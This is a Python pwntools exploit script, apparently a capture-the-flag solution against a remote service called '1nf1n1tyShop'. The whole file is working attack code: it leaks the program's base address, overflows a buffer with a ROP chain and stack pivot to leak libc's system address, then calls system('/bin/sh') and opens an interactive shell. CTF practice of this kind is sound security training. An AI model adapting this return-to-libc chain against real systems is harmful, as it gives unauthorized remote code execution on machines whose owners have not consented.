#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='i386', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./1nf1n1tyShop")
libc = ELF("libc.so.6")
ld = ELF("ld-linux.so.2")
context.binary = exe

# io = gdb.debug(exe.path, '', api=True)
# io = remote('127.0.0.1', 5000)
io = remote('pwn.1nf1n1ty.team', 31798)

io.sendlineafter(b'>', b'traveller')
io.sendlineafter(b'>', b'4')
exe.address = int(io.recvuntil(b'>').lstrip(b'You prize: ')[:10], 16) -  0x11ed  
print(f"Base address: {hex(exe.address)}")

# addresses
ret = p32(exe.address+0x100a)
sub_esp_ret = p32(exe.address+0x1212)

# leak system address
rop = ROP(exe)
rop.raw(exe.sym.main)
payload = b'\x00'*128+rop.chain()+b'\x00'*(44-len(rop.chain()))+sub_esp_ret
io.sendline(b'2')
io.sendafter(b'>', payload)
io.sendlineafter(b'>', b'hacker')
io.sendlineafter(b'>', b'4')
libc.address = int(io.recvuntil(b'>').lstrip(b'You prize: ')[:10], 16)-libc.sym.system
print(f"Libc address: {hex(libc.address)}")

# get system shell
io.sendline(b'2')
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b'\x00'*128+rop.chain()+b'\x00'*(44-len(rop.chain()))+sub_esp_ret
io.sendafter(b'>', payload)

print("Here is your shell :)")

io.interactive()
